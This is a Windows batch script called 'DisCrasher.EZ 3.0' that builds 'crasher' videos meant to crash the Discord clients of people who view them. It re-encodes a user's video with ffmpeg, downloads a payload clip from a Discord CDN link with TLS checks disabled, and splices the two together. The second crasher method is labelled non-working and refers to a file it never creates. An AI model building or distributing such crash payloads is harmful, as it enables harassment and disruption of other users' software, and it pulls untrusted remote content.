@echo off
title DisCrasher.EZ 3.0 - made by NeumaticYT
color 0e
echo Yb    dP 88 8888b.  888888  dP"Yb       dP""b8 88""Yb    db    .dP"Y8 88  88 888888 88""Yb     88888      dP"Yb  
echo  Yb  dP  88  8I  Yb 88__   dP   Yb     dP   `" 88__dP   dPYb   `Ybo." 88  88 88__   88__dP       .dP     dP   Yb 
echo   YbdP   88  8I  dY 88""   Yb   dP     Yb      88"Yb   dP__Yb  o.`Y8b 888888 88""   88"Yb      o `Yb .o. Yb   dP 
echo    YP    88 8888Y"  888888  YbodP       YboodP 88  Yb dP""""Yb 8bodP' 88  88 888888 88  Yb     YbodP `"'  YbodP             
echo.
echo.
echo.
echo.
echo.
timeout>null 2 /nobreak
pause>null
cls
goto changelog
:changelog
echo  dP""b8 88  88    db    88b 88  dP""b8 888888 88      dP"Yb   dP""b8 
echo dP   `" 88  88   dPYb   88Yb88 dP   `" 88__   88     dP   Yb dP   `" 
echo Yb      888888  dP__Yb  88 Y88 Yb  "88 88""   88  .o Yb   dP Yb  "88 
echo  YboodP 88  88 dP""""Yb 88  Y8  YboodP 888888 88ood8  YbodP   YboodP                   
echo.
echo. 
echo 1.  New menu redesign!             / Nuevo cambio de menu!
echo 2.  Fixed optimization not working / Actualizada la optimizacion del programa
echo 3.  Credits to NeumaticYT#6891 for menu supporting / Gracias a NeumaticYT#6891 por hacer el menu nuevo!
echo 4.  Added Crasher 2.0 with a new Crashing Method (DOES NOT WORK) / Nuevo metodo por si se patchea! (NO FUNCIONA)
echo.
echo.
echo                  Welcome, hakerino
echo.
echo.
echo Presiona cualquier tecla para continuar / Press any key to continue...
pause>null
cls
:0restart


echo Press 1 for crasher number 1
echo Press 2 for crasher number 2 
echo (they are different, though you won't notice anything)
set /p num="Select the number: "

if %num%==1 (
goto crasher1
)

if %num%==2 (
goto crasher2
)
echo You can only put 1 or 2. Is it that hard?
goto 0restart

:crasher1
set /p videoname=Write the video file name / Escribe el nombre del archivo (without .mp4):
echo Guardando informacion...
timeout>null 1 /nobreak
cls
echo Guardando informacion..
timeout>null 1 /nobreak
cls
echo Guardando informacion.
timeout>null 1 /nobreak
cls
set /p crashername=Write the crasher file name / Escribe el nombre final (without .mp4):
echo Preparando cositas con comandos!
timeout>null 2 /nobreak
cls
ffmpeg -i %videoname%.mp4 "01110101-01110101-01101000-01101000-01101000.mp4" 
curl -ko "abc.mp4" "https://cdn.discordapp.com/attachments/965003761485492314/987416285216387142/FemaleAnimatedHyrax-mobile.mp4"
(
echo file 01110101-01110101-01101000-01101000-01101000.mp4
echo file abc.mp4
)>"uwu.txt"
ffmpeg -f concat -i uwu.txt -codec copy %crashername%.mp4
del "uwu.txt"
del "abc.mp4"
del "01110101-01110101-01101000-01101000-01101000.mp4"
echo Enjoy your crashing video!
timeout>null 2 /nobreak
echo Press any key to continue... / Presiona cualquier tecla para continuar...
pause>null
exit

:crasher2
echo.
echo				WARNING!
echo			        Crasher 2
echo				does NO
echo				longer
echo				 work
echo			      Maybe in v4.0?
echo.
echo Exit? (1) or Continue? (2)
set /p num="Select the number: "

if %num%==1 (
goto 0restart
)

if %num%==2 (
echo
set /p videoname=Write the video file name / Escribe el nombre del archivo (without .mp4):
echo Guardando informacion...
timeout>null 1 /nobreak
cls
echo Guardando informacion..
timeout>null 1 /nobreak
cls
echo Guardando informacion.
timeout>null 1 /nobreak
cls
set /p crashername=Write the crasher file name / Escribe el nombre final (without .mp4):
echo Preparando cositas con comandos!
timeout>null 2 /nobreak
cls
ffmpeg -i %videoname%.mp4 video.webm
curl -ko "abc.mp4" "https://cdn.discordapp.com/attachments/965003761485492314/987416285216387142/FemaleAnimatedHyrax-mobile.mp4"
(
echo file video.webm
echo file black.webm
)>"uwu.txt"
ffmpeg -f concat -i uwu.txt -codec copy %crashername%.mp4
del "uwu.txt"
del "video.webm"
echo Enjoy your crashing video!
timeout>null 2 /nobreak
echo Press any key to continue... / Presiona cualquier tecla para continuar...
pause>null
exit
)

